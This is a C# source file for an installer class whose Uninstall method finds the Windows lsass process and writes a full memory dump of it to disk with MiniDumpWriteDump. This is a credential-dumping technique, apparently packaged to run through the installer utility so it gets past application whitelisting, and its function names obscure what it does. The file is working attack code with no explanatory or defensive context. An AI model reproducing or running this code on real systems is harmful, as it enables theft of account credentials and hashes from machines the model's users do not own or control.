using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Install
{
    [System.ComponentModel.RunInstaller(true)]
    public class NewInstaller : System.Configuration.Install.Installer

    {

        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        public static void ProcCapContents()
        {
            //Find target proc
            Process tProc = null;
            Process[] processes = Process.GetProcessesByName("lsass");
            tProc = processes[0];

            IntPtr hProc = IntPtr.Zero;
            uint iProc = 0;

            //Get proc id and handle
            iProc = (uint)tProc.Id;
            hProc = tProc.Handle;

            string outFile = String.Format("{0}.dmp", iProc);

            //Perform the minidump
            using (FileStream fileS = new FileStream(outFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                MiniDumpWriteDump(hProc, iProc, fileS.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }

        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            ProcCapContents();

        }

        static void Main(string[] args)
        {


        }

    }
}